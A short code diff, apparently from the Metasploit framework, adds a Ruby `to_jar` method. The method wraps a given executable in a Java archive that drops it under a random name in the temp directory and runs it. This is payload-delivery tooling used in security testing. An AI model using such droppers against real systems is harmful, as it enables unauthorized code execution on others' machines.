@@ -848,6 +848,27 @@ require 'digest/sha1'
 		to_exe_asp(to_win32pe(framework, code, opts), opts)
 	end
 
+	# Creates a jar file that drops the provided +exe+ into a random file name
+	# in the system's temp dir and executes it.  
+	#
+	# See also: +Msf::Core::Payload::Java+
+	#
+	def self.to_jar(exe, opts={})
+		spawn = opts[:spawn] || 2
+		exe_name = Rex::Text.rand_text_alpha(8) + ".exe"
+		zip = Rex::Zip::Jar.new
+		paths = [
+			[ "metasploit", "Payload.class" ],
+		]
+		zip.add_files(paths, File.join(Msf::Config.install_root, "data", "java"))
+		zip.build_manifest :main_class => "metasploit.Payload"
+		config = "Spawn=#{spawn}\r\nExecutable=#{exe_name}\r\n"
+		zip.add_file("metasploit.dat", config)
+		zip.add_file(exe_name, exe)
+
+		zip
+	end
+
 	# Creates a Web Archive (WAR) file from the provided jsp code. Additional options
 	# can be provided via  the "opts" hash.
 	def self.to_war(jsp_raw, opts={})
